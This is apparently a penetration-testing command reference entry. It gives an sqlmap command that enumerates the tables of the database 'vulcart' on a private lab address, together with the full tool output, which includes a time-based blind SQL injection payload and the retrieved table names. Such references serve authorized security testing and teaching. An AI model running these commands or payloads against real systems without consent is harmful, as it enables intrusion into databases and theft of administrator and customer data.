---
id: dd43e9a5-e8fa-49a5-a806-6a47ba47abb5
name: SQLMap Command to Dump Table Names From Database
type: command
executor: ''
data: sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' -D vulcart --tables
output: "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [,]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 22:50:42\n\n\
  [22:50:43] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[22:50:43]\
  \ [INFO] resuming back-end DBMS 'mysql' \n[22:50:43] [INFO] testing connection to\
  \ the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[22:50:46] [INFO] the back-end DBMS is MySQL\nweb application\
  \ technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.12\n[22:50:46]\
  \ [INFO] fetching tables for database: 'vulcart'\n[22:50:46] [INFO] fetching number\
  \ of tables for database 'vulcart'\n[22:50:46] [WARNING] time-based comparison requires\
  \ larger statistical model, please wait.............................. (done)   \
  \                      \ndo you want sqlmap to try to optimize value(s) for DBMS\
  \ delay responses (option '--time-sec')? [Y/n] y\n[22:51:01] [WARNING] it is very\
  \ important to not stress the network connection during usage of time-based payloads\
  \ to prevent potential disruptions \n[22:51:21] [INFO] adjusting time delay to 1\
  \ second due to good response times\n6\n[22:51:22] [INFO] retrieved: admindetails\n\
  [22:52:31] [INFO] retrieved: feedback\n[22:53:12] [INFO] retrieved: orders\n[22:53:52]\
  \ [INFO] retrieved: products\n[22:54:51] [INFO] retrieved: returnprod\n[22:56:04]\
  \ [INFO] retrieved: userdetails\nDatabase: vulcart\n[6 tables]\n+--------------+\n\
  | admindetails |\n| feedback     |\n| orders       |\n| products     |\n| returnprod\
  \   |\n| userdetails  |\n+--------------+\n\n[22:57:10] [INFO] fetched data logged\
  \ to text files under '/root/.sqlmap/output/192.168.43.68'\n\n[*] shutting down\
  \ at 22:57:10\n"
created_at: '2020-08-19T17:42:16.503540+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command to Dump Table Names From Database

```bash
sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' -D vulcart --tables
```

## Expected Output

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:50:42

[22:50:43] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:50:43] [INFO] resuming back-end DBMS 'mysql' 
[22:50:43] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[22:50:46] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.12
[22:50:46] [INFO] fetching tables for database: 'vulcart'
[22:50:46] [INFO] fetching number of tables for database 'vulcart'
[22:50:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                         
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[22:51:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[22:51:21] [INFO] adjusting time delay to 1 second due to good response times
6
[22:51:22] [INFO] retrieved: admindetails
[22:52:31] [INFO] retrieved: feedback
[22:53:12] [INFO] retrieved: orders
[22:53:52] [INFO] retrieved: products
[22:54:51] [INFO] retrieved: returnprod
[22:56:04] [INFO] retrieved: userdetails
Database: vulcart
[6 tables]
+--------------+
| admindetails |
| feedback     |
| orders       |
| products     |
| returnprod   |
| userdetails  |
+--------------+

[22:57:10] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'

[*] shutting down at 22:57:10

```
